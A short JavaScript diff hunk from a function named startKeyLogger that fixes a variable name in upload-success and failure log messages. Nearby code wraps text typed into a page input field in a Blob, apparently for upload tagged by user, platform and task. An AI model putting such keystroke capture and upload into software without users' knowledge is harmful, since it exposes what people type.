@@ -64,10 +64,10 @@ function startKeyLogger(user_id_str, platform_initial, task_id) {
     const result1 = await res1.json();
 
     if (res1.ok && result1.url) {
-      console.log("✅ Uploaded!", result.url);
-      console.log(`✅ Uploaded!\nURL: ${result.url}`);
+      console.log("✅ Uploaded!", result1.url);
+      console.log(`✅ Uploaded!\nURL: ${result1.url}`);
     } else {
-      console.error("❌ Upload failed:", result);
+      console.error("❌ Upload failed:", result1);
     }
     const typed_text_blob = new Blob(
       [document.getElementById("input_value").value],
